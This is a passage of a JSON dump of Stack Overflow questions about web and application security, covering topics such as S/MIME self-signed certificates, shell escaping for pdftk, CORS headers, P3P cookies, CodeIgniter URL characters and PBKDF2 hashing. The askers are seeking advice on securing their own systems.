 I could also work in a token refresh, but I think this would be more of a false sense of security.</p>\n\n<p>3) Don't use CAS but come up with another way to get an auth token for the service.</p>\n\n<p>Any advice of how others have implemented similar scenarios (if it's been done)?</p>\n\n<p>Thanks.</p>\n"},{"tags":["security","public-key-encryption","privatekey","certificate-authority","smime"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":137,"score":0,"question_id":11996229,"title":"Whats wrong with being your own Certificate Authority and self-signing for your email encryption?","body":"<p>Is there any real reason to use a 3rd party Certificate Authority for your own email security?</p>\n\n<p>( meaning using S/MIME )</p>\n\n<p>I found I am able to become my own CAuthority and create my own self-signed root certificates...and they work just fine installed on my machines and mobile devices.</p>\n\n<p>Is there a compelling reason to use a 3rd party's paid certificates instead of my own self-generated and signed ones that I control?  </p>\n\n<p>I keep thinking - the person or entity I most trust with the authority of my validated encrypted emails... is ME!... why would I let an additional un-verifiable by me entity into that chain of communication? - if who Im sending emails to is others who know me and trust that its me..? and why would I PAY them? </p>\n\n<p>I can understand if the communication is between my commercial website and unknown outside individuals who don't know me and are transacting money... but for personal email? between family and well known friends or co-wokers?  </p>\n\n<p>Is there something else I don't understand about public-private key encryption that makes having a validated big 3rd party give me the certificates worth paying for?</p>\n\n<p>I understand the need for SSL 3rd party verify when dealing with commerce on websites or trusting websites with your secure connectivity.  But between individuals? it seems different...individuals that you know personally even more different. No?</p>\n"},{"tags":["asp.net-mvc","security","webforms","sso","siteminder"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":11622709,"title":"trying to use WebForm (ASPX) login page with MVC 3 app","body":"<p>I have a technical requirement to start from a \"public\" (non-secure) physical ASPX page and then bridge into an MVC 3 application.  I have figured out the changes to \"routing\", but the MVC [Authorize] does not seem to recognize that the user (cookie) is authenticated.  It keeps taking me back to the ASPX login page.</p>\n\n<p>Has anyone successfully used a standard, physcial page as login, and then transfer into secure MVC? This is part of a larger SSO design effort.</p>\n"},{"tags":["android","mysql","security","session"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12016112,"title":"Best way for a login \"session\" in Android(advice)","body":"<p>I have an app which pulls some user data from a MySQL server and stores it in a local SQLite. I use that session like.</p>\n\n<p>My wonder is that anyone that knows your id, or username can fake your account. Is there any better way to have something session like in Android? Need advice and experience.</p>\n"},{"tags":["java","security"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":105,"score":2,"question_id":12007991,"title":"How can I securely wipe a confidential data in memory in java with guarantee it will not be 'optimized'?","body":"<pre><code>String secret=\"foo\";\nWhatILookFor.securelyWipe(secret);\n</code></pre>\n\n<p>And I need to know that it will not be removed by java optimizer.</p>\n"},{"tags":["php","security","web-security","pdftk"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12015718,"title":"Security of PHP exec() with pdftk utility","body":"<p>I'm interested to use <a href=\"http://www.pdflabs.com/tools/pdftk-the-pdf-toolkit/\" rel=\"nofollow\">pdftk</a> (the pdft toolkit) by calling it from a PHP script. I intend to use the <a href=\"http://www.php.net/manual/en/function.exec.php\" rel=\"nofollow\"><code>exec()</code></a> function for this. The command would follow this format:</p>\n\n<p><code>pdftk [form_file] fill_form [data_file] output [output_file] flatten</code></p>\n\n<p>This command takes a form PDF file (<code>form_file</code>) and inserts the FDF data from <code>data_file</code> and flattens the form and saves it as <code>output_file</code>.</p>\n\n<p>Here is what I'm thinking to secure the execution of this command via a function like <code>exec()</code></p>\n\n<ul>\n<li>Directory and file names are not user-defined. Directory and file names are generated based on sanitized identifier strings and will only contain alphanumeric characters, dashes, underscores, and periods. The identifier strings will have a limited, practical length.</li>\n<li>Arguments (filenames) are passed through <a href=\"http://www.php.net/manual/en/function.escapeshellarg.php\" rel=\"nofollow\"><code>escapeshellarg()</code></a> before being concatenated into the command (though this is probably unnecessary if the proceeding step is free of vulnerabilities).</li>\n<li>The entire command is passed through <a href=\"http://www.php.net/manual/en/function.escapeshellcmd.php\" rel=\"nofollow\"><code>escapeshellcmd()</code></a>.</li>\n</ul>\n\n<p>Am I overlooking any security vulnerabilities when it comes to executing this command? (The only one I can think of now is if there is a vulnerability with pdftk itself and how it processes the files.) Any suggestions to improve this process? Thanks.</p>\n"},{"tags":["security","encryption","ssh","webserver","rsa"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12014746,"title":"Public key access to ssh refused through putty","body":"<p>I get the server refused key error. Anyone know how to resolve this?</p>\n\n<p>I generated a rsa key using puttygen. Saved a public key and a private key. Appended public key to ~/.ssh/authorized_keys file. Loaded the private key through putty and proceeded to connect. Error server refused key.</p>\n\n<p>So I looked up <a href=\"http://www.walkernews.net/2009/03/22/how-to-fix-server-refused-our-key-error-that-caused-by-putty-generated-rsa-public-key/\" rel=\"nofollow\">this</a> solution</p>\n\n<p>Sadly it did not work either. .ssh is 700 chmod. authroized_keys is 600 chmod. Both by the same user that I use to connect.</p>\n\n<p>To give a little more information. I changed my home directory of my user to /var/www. And thats the directory I work with. Anyway, I create the .ssh directory using <code>~/</code> as a prefix always. I also checked its location. Home directory. I am also running an all purpose build of CentOs.</p>\n"},{"tags":["ajax","security","access-control"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12001269,"title":"What are the security risks of setting Access-Control-Allow-Origin?","body":"<p>I recently had to set <code>Access-Control-Allow-Origin</code> to <code>*</code> in order to be able to make cross-subdomain ajax calls.<br>\nNow I can't help but feel that I'm putting my environment to security risks.<br>\nPlease help me if I'm doing it wrong.</p>\n"},{"tags":["security","url"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12010246,"title":"Posting user data in a URL","body":"<p>Is it unwise to do this? The thing I'm talking about is username and password being passed to a processing file, like this:</p>\n\n<pre><code>echo'&lt;script&gt;location.href=\"process.php?u='.$_POST['username'].'&amp;p='.md5($_POST['password']).'\"&lt;/script&gt;';\n</code></pre>\n\n<p>This is after the username and password has been validated. Could this somehow be intercepted maliciously? Or is this a safe enough thing to do?</p>\n"},{"tags":["security","cookies","p3p","3rd-party"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12011645,"title":"3rd Party Cookies, What's wrong with this scenario","body":"<p>I've hit a wall of frustration while dealing with a 3rd party payment processor. They claim to be reputable but we can't work past this issue. They've instructed our client to simply display a large warning and tutorial to get the customers to enable 3rd party cookies in their browsers.  The problem with this is, the customers can't be bothered to do that. Mom and pop purchasers see a warning about enabling 3rd party cookies and leave to go to another site. If the customers turn on 3rd party cookies, are they opening themselves up to privacy issues? Is there a U.S. law around this? </p>\n\n<p>Their system is implemented in a frame and attempts to set a cookie.  From what research I've done in the last day, it seems like 3rd party cookies should be accepted as long as a solid P3P header is provided?</p>\n\n<p>I've set up a simple test:</p>\n\n<p><a href=\"http://www.tehuber.com/p3ptest.html\" rel=\"nofollow\">http://www.tehuber.com/p3ptest.html</a></p>\n\n<p>All this does is display an iframe that points to another domain on a different server which sets a cookie. Then it does a meta refresh to a second url which attempts to display and validate the cookie.</p>\n\n<p>This test works for me in IE6+, FF, Safari, Chrome, and Opera.  But I have to be honest, I've only studied the P3P junk for a day and I'm not confident that this \"test\" really proves that the Compact P3P header I've created is all that needs to be used to make this work on the 3rd party site.</p>\n\n<p>My header:</p>\n\n<pre><code>header('P3P: policyref=\"/p3p.xml\", CP=\"NOI DSP COR CURa ADMa DEVa OUR IND\"');\n</code></pre>\n\n<p>/p3p.xml is here:</p>\n\n<p><a href=\"http://www.redtacks.com/p3p.xml\" rel=\"nofollow\">http://www.redtacks.com/p3p.xml</a></p>\n\n<p>Does this p3p.xml introduce any security concerns?</p>\n\n<p>Is simply showing this works in an iframe enough to forward to the 3rd party and provide example of how they need to update their service? What am I missing here. Why wouldn't they do it this way?</p>\n\n<p><strong>Follow up question</strong>, it seems IBMs P3P generator no longer exists? Is there a easy place I can learn what all the values in the Compact P3P key mean?</p>\n\n<p>Thanks</p>\n"},{"tags":["security","internet-explorer",".doc"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":173,"score":0,"question_id":12013892,"title":"IE7/8 won't open .XLS or .DOC file from server - Only for few users","body":"<p>We have a lot of Excel, Word and PDF files on our intranet site for all the employees to download. For some users who have Windows XP Prof and IE 8, they can't open .doc or .xls  file types but they are able to open PDF files. It works fine in Chrome. When the file download - security warning pops up, they are not able to open or save. If I try to open, it's blank and if I try to save, I get an error. Also, the file extension is not .doc, it shows as _doc (see image). I read the below post but still it keeps doing the same thing. </p>\n\n<p><a href=\"http://stackoverflow.com/questions/5723520/why-wont-ie8-wont-open-xls-file-from-server?rq=1\">Why won&#39;t IE8 won&#39;t open &quot;.XLS&quot; file from server?</a></p>\n\n<p><img src=\"http://i.stack.imgur.com/20fSZ.png\" alt=\"enter image description here\"> </p>\n"},{"tags":["php","security","codeigniter","url"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":68,"score":3,"question_id":12013732,"title":"What are the security risks of allowing all characters in the website URL?","body":"<p>I'm using the <a href=\"http://codeigniter.com/\" rel=\"nofollow\">Codeigniter</a> PHP framework. In one of the config files, you can set the allowed URL characters:</p>\n\n<pre><code>$config['permitted_uri_chars'] = 'a-z 0-9~%.:_\\-'; \n</code></pre>\n\n<p>So if I attempt to go to this url: <em>website.com/controller/%22quotedString%22</em>, I will get an error unless I append a quote to the permitted characters:</p>\n\n<pre><code>$config['permitted_uri_chars'] .= '\"'; \n</code></pre>\n\n<p>My application actually needs to allow <em>all</em> weird characters in the URL, but I don't want have a huge hardcoded list of characters. Codeigniter warns against allowing all characters:</p>\n\n<blockquote>\n<pre><code>/*\n|--------------------------------------------------------------------------\n| Allowed URL Characters\n|--------------------------------------------------------------------------\n|\n| As a security measure you are STRONGLY encouraged to restrict URLs to\n| as few characters as possible.  By default only these are allowed: a-z 0-9~%.:_-\n|\n| Leave blank to allow all characters -- but only if you are insane.\n|\n| DO NOT CHANGE THIS UNLESS YOU FULLY UNDERSTAND THE REPERCUSSIONS!!\n|\n*/\n</code></pre>\n</blockquote>\n\n<p>They don't say exactly what are security issues with allowing all characters. So what are the issues?</p>\n"},{"tags":["java","string","security"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":87,"score":3,"question_id":12013438,"title":"Java storing sensitive 'key' as String or char[]?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/8881291/why-is-char-preferred-over-string-for-passwords\">Why is char[] preferred over string for passwords?</a>  </p>\n</blockquote>\n\n\n\n<p>I read somewhere that storing a sensitive key as a char[] rather than a String is better because the latter can be found in the memory. It also makes a little sense because of JPasswordField's getText() method being Deprecated.</p>\n\n<p>Is this true?</p>\n"},{"tags":["security","pbkdf2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12012761,"title":"Client side or server side pbkdf2","body":"<p>I was wondering how you implement a client side PBKDF2 secure solution. I would like to have the pbkdf2 algorithm to run on the client side in javascript to prevent the server from doing the cpu intensive work. But how do you do this?</p>\n\n<p>I presume that the best solution is to store a per user salt in the user database. To do the PBKDF2 you need the salt and the password entered by the user. But how do I get the per user salt from the user database to the client side? Or is it a \"global\" salt that you would use in this case? And then add more security on the server side by hashing the hash with a per user salt?</p>\n\n<p>Thanks in advance</p>\n\n<p>Cheers</p>\n\n<p>Kim</p>\n"},{"tags":["query","security","malicious"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12012617,"title":"Suspicious string of numbers sent by user on web app","body":"<p>I have a web application and something odd has happened in the database, as in every user had its' sex changed to female, which is very troubling. </p>\n\n<p>I see that some user has sent a series of messages to another user with the following text:</p>\n\n<p>hajQuery17205850606500171125_1345170243079\nhajQuery17205850606500171125_1345170243080\nhajQuery17205850606500171125_1345170243082\nhajQuery17205850606500171125_1345170243084\nhajQuery17205850606500171125_1345170243086</p>\n\n<p>What is this?</p>\n"},{"tags":["sql","mysql","security","encryption","cryptography"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":134,"score":3,"question_id":2639215,"title":"MySQL - connection and security","body":"<p>I was wondering if someone could tell me if there is any potential security breeches that could occur by connecting to a sql database that does not reside at 'localhost' i.e. via ip address?</p>\n\n<p>Regards,</p>\n\n<p>Phil </p>\n"}]}
